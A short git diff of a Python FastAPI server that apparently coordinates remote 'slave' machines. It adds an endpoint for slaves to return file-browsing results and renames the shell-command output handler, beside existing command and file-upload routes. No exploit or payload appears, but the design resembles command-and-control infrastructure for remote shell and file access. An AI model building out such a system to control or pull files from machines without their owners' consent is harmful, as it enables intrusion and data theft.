@@ -4,7 +4,7 @@ from fastapi.responses import FileResponse
 import os
 import json
 from fastapi import FastAPI, Request, UploadFile, HTTPException
-from models import SlaveCommandRequest, SlaveTextOutputRequest, MasterCommandRequest
+from models import SlaveCommandRequest, SlaveTextOutputRequest, MasterCommandRequest, SlaveFileBrowseOutputRequest
 from fastapi.responses import FileResponse
 import redisutil
 import service as Service
@@ -36,7 +36,11 @@ async def command(request: Request, slave_command: SlaveCommandRequest):
     
 @app.post("/api/slave/response/text")
 async def textresponse(slave_text_op_req : SlaveTextOutputRequest):
-    return Service.set_slave_command_output(slave_text_op_req)
+    return Service.set_slave_shell_command_output(slave_text_op_req)
+
+@app.post("/api/slave/response/filebrowse")
+async def filebrowseresponse(slave_file_browse_op_req : SlaveFileBrowseOutputRequest):
+    return Service.set_slave_file_browse_command_output(slave_file_browse_op_req)
     
 @app.post("/api/slave/response/file")
 async def fileresponse(mac: str, file: UploadFile):
